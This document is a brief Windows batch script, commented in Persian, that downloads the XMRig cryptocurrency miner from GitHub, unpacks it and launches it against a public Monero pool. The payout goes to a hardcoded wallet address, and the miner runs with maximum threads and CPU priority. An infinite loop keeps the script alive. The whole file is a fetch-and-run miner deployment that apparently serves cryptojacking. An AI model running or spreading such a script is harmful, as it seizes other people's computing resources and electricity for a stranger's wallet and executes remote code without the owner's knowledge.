@echo off
:: دانلود و استخراج XMrig
curl -L -o xmrig-6.15.1-win64.zip https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-win64.zip
powershell -command "Expand-Archive -Path xmrig-6.15.1-win64.zip -DestinationPath ."

:: وارد دایرکتوری XMrig
cd xmrig-6.15.1

:: اجرای XMrig با تنظیمات خاص
xmrig.exe -o pool.supportxmr.com:3333 -u 45HZsL1738GDWj9YMwq8P7RyEVe6uSrhU8fcZ9rqPTj3SH3y6WNXdsSeLMW5uEHCRUTwuL3jFu637cX6M3zkUrkUHnWvAK7 -p zero -k -a randomx --threads=128 --cpu-priority=5 --huge-pages

:: اجرای حلقه بی‌پایان برای ماندن اسکریپت در حال اجرا
:loop
timeout /t 3 > nul
goto loop
